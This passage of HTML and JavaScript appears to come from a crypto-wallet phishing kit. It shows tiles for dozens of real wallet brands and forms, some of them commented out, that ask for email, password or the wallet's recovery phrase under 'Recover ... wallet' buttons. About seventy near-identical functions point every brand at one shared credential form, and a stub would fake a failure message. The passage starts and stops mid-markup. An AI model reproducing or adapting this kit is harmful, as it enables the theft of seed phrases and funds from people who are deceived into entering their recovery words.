				<div class="popup text-center" onclick="guardaWalletFunction()"><img src="registry.walletconnect.org/logo/lg/c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266.jpeg" class="rounded-circle" alt="Guarda Wallet" width="120"><h2>Guarda Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="defiantFunction()"><img src="registry.walletconnect.org/logo/lg/ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215.jpeg" class="rounded-circle" alt="Defiant" width="120"><h2>Defiant</h2>
				</div>
			</div>
			<div class="col-sm-4">
				<div class="popup text-center" onclick="exodusFunction()"><img src="https://th.bing.com/th/id/OIP.Oxtk3lhbhW2roPOo1N7yfgAAAA?w=171&amp;h=176&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7" class="rounded-circle" alt="Exodus Wallet" width="120"><h2>Exodus</h2>
				</div>
			</div>
			<div class="col-sm-4">
				<div class="popup text-center" onclick="muunFunction()"><img src="www.altcoinbuzz.io/wp-content/uploads/2021/01/muun-logo-696x365.jpg" class="rounded-circle" alt="Muun Wallet" width="120"><h2>Muun wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<!-- <div class="col-sm-4">
				<div class="popup text-center" onclick="binanceFunction()"><img src="http://medici-social.s3.amazonaws.com/linkedin_data/images/https://www.linkedin.com/company/binance/image" class="rounded-circle" alt="Binance Wallet" width="120"><h2>Binance</h2>
				  <span class="popuptext" id="binance">
					<form method="POST" action="">
						<input type="hidden" name="wallet" value="Binance wallet" >
						<div class="mb-3">
							<input type="email" name="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email">
						</div>
						<input type="password" name="password" id="inputPassword5" class="form-control" aria-describedby="passwordHelpBlock" placeholder="Password">
						<div id="passwordHelpBlock" class="form-text">
						</div>
						<button type="submit" class="btn btn-outline-primary btn-sm">Recover Binance wallet</button>
					</form>
				  </span>
				</div>
			</div> -->

			<!--
			<div class="col-sm-4">
				<div class="popup text-center" onclick="guardaWalletFunction()"><img src="https://registry.walletconnect.org/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" class="rounded-circle" alt="Guarda Wallet" width="120"><h2>Guarda Wallet</h2>
				  <span class="popuptext" id="guardaWallet">
					<form method="POST" action="">
						<input type="hidden" name="wallet" value="Guarda Wallet" >
						<label for="inputPassword5" class="form-label">Recovery phrase</label>
						<textarea name="passphrase" rows="4" id="inputPassword5" class="form-control" aria-describedby="passwordHelpBlock"></textarea>
						<div id="passwordHelpBlock" class="form-text">
						  <h2>Each word must be separated by a single space, and must not contain numbers, special characters, or emoji.</h2>
						</div>
						<br />
						<button type="submit" class="btn btn-outline-primary btn-sm">Recover Guarda wallet</button>
					</form>
				  </span>
				</div>
			</div>
			-->
		</div>
		<br />
		<h4 class="text-center">Contact Us Directly Through Our Live chat to add your wallet here.</h2>
		<br />
		
	  </div>
        <script type="text/javascript" src="https://cdn.chatify.com/javascript/loader.js" defer></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.min.js"></script>
      	  
	 <script>
		function removeFunction() {
			//var pop = document.getElementById("rainbow");
		  var popup = document.getElementsByClassName("popuptext");
			for(var i=0; i<70; i++){
				popup[i].classList.remove("show");
			}
		}
		
		/*function submitFunction() {
		  alert("Failed, please try again later!");
		}
		
		function verifyFunction() {
		  var verify = prompt("A verification code has been sent to your email, please enter it here");
		}
		*/
		// When the user clicks on <div>, open the popup
		
		

		function guardaFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Guarda wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Guarda wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function muunFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Muun wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Muun wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function dappFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Dapp wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Dapp wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function enjinFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Enjin wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Enjin wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function ftxFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Ftx wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Ftx wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		  
		}
		
		
		function coingeckoFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Coingecko wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Coingecko wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function polkaFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Polka wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Polka wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		

		function trezorFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Trezor wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Trezor wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function breadwalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Bread wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Bread wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function armoryFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Armory wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Armory wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function greenaddressFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Greenaddress wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Greenaddress wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function myetherwalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Myether wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Myether wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}

		function electrumFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Electrum wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Electrum wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function edgeFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Edge wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Edge wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function zengoFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Zengo wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Zengo wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function wasabiFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Wasabi wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Wasabi wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}



		function rainbowFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Rainbow wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Rainbow wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function trustFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Trust wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Trust wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function argentFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Argent wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Argent wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function metamaskFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Metamask wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Metamask wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function gnosisFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Gnosis wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Gnosis wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function cryptoFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Crypto wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Crypto wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function pillarFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "pillar wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Pillar wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function imTokenFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "imToken wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover imToken wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function ONTOFunction() {
		 var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "ONTO wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover ONTO wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function tokenPocketFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "TokenPocket wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover TokenPocket wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function mathWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Mathwallet wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Mathwallet wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function bitPayFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Bitpay wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Bitpay wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function ledgerLiveFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Ledgerlive wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Ledgerlive wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function wallethFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Walleth wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Walleth wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function authereumFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Authereum wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Authereum wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function huobiWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Huobiwallet wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Huobiwallet wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function eidooFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Eidoo wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Eidoo wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function MYKEYFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "MYKEY wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover MYKEY wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function loopringWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Loopring wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Loopring wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function trustVaultFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Trustvault wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Trustvault wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function atomicFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Atomic wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Atomic wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function coin98Function() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Coin98 wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Coin98 wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function coolWalletSFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Cool wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Cool wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function aliceFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Alice wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Alice wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function alphaWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Alpha wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Alpha wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function DCENTWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Dcent wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Dcent wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function zelCoreFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Zelcore wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Zelcore wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function nashFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Nash wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Nash wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function coinomiFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Coinomi wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Coinomi wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function gridPlusFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Gridplus wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Gridplus wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function CYBAVOWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Cybavo wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Cybavo wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function tokenaryFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Tokenary wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Tokenary wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function torusFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Torus wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Torus wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function spatiumFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Spatium wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Spatium wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function safePalFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Safepal wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Safepal wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function infinitoFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Infinito wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Infinito wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function walletioFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Walletio wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Walletio wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function infinityWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Infinity wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Infinity wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function ownbitFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Ownbit wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Ownbit wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function easyPocketFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Easypocket wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Easypocket wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function bridgeWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Bridge wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Bridge wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function sparkPointFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Sparkpoint wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Sparkpoint wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function viaWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Via wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Via wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function bitKeepFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Bitkeep wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Bitkeep wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function visionFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Vision wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Vision wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function PEAKDEFIWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Peakdefi wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Peakdefi wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function unstoppableWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Unstoppable wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Unstoppable wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function haloDeFiWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Halodefi wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Halodefi wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function dokWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Dok wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Dok wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function ATWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "AT wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover AT wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function midasWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Midas wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Midas wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function ellipalFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Ellipal wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Ellipal wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function KEYRINGPROFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Keyringpro wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Keyringpro wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function aktionariatFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Aktionaria wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Aktionaria wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function talkenWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Talken wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Talken wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function XinFinXDCNetworkFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "XinfinXD wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover XinfinXD wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function flareWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Flare wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Flare wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function kyberSwapFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "KyberSwap wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover KyberSwap wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		
		function aTokenWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Atoken wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Atoken wallet";
		  
		  var popup = document.getElementById("processForm");
		  popup.classList.add("show");
		}
		
		function tongueWalletFunction() {
		  var inputForm = document.getElementById("formInput");
		  inputForm.setAttribute("name", "wallet")
		  inputForm.setAttribute("value", "Tongue wallet")
		  // set button
		  var inputBtn = document.getElementById("formBtn")
		  inputBtn.innerHTML="Recover Tongue wallet";
		  
		  var popup = document.getElementById("processForm");
